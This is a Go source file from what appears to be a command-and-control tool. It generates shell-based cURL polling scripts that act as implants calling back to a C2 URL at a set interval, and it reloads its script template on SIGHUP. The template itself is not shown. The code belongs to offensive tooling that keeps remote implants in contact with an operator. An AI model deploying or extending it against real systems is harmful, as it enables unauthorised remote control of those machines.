// Package clgen - Generate a self-backgrounding, shell-powered cURL loop
package clgen

/*
 * clgen.go
 * Generate a shell-powered cURL loop
 * By J. Stuart McMurray
 * Created 20230726
 * Last Modified 20230726
 */

import (
	"fmt"
	"log"
	"os"
	"os/signal"
	"sync"
	"text/template"

	"github.com/magisterquis/plonk/internal/lib"
	"golang.org/x/sys/unix"
)

// Compile-time-settable variables.
var (
	/* TemplateFile is the path to the template for generating cURL
	commands. */
	TemplateFile = "clgen.tmpl"

	/* C2URLParam is the parameter used to explicitly set the C2 URL in
	the returned script.  It may be a URL query parameter, a POST
	parameter, or a header name. */
	C2URLParam = "c2url"

	/* IntervalParam is the parameter used to set the callback interval.
	It is used in the same way as C2URLParam. */
	IntervalParam = "cbint"

	/* CallbackInterval is the default callback interval for the script,
	as parsed by time.ParseDuration.  This will be rounded domwn to the
	nearest whole second. */
	CallbackInterval = "5s"
)

// MessageTypeCLGen is how we tag failures in cURL loop things.
const MessageTypeCLGen lib.MessageType = "CURLLOOP"

var (
	// cTemplate holds our parsed template.
	cTemplate  *template.Template
	cTemplateL sync.RWMutex
)

// templateParams holds the parameters we pass to the template.
type templateParams struct {
	RandN    string /* Random base36 number, for ImplantID. */
	URL      string /* C2 URL for /{t,o}/ImplantID */
	Interval int    /* Callback interval, in seconds. */
}

// Init gets or makes the template, and starts a watcher to re-read it on
// SIGHUP.  It should not be called until we can open files, i.e. after
// our working directory is sorted.
func Init() error {
	/* Make sure the callback interval is sane. */

	/* Work out where we'll store the template. */
	TemplateFile = lib.AbsPath(TemplateFile)

	/* Load the initial template. */
	if err := loadTemplate(); nil != err {
		return fmt.Errorf("getting initial template: %w", err)
	}

	/* Start a template re-reader on SIGHUP. */
	ch := make(chan os.Signal, 2)
	signal.Notify(ch, unix.SIGHUP)
	go func() {
		for range ch {
			if err := loadTemplate(); nil != err {
				log.Printf(
					"[%s] Error loading cURL loop "+
						"template from %s: %s",
					MessageTypeCLGen,
					TemplateFile,
					err,
				)
			}
			log.Printf(
				"[%s] Re-read template from %s",
				lib.MessageTypeSIGHUP,
				TemplateFile,
			)
		}
	}()

	return nil
}
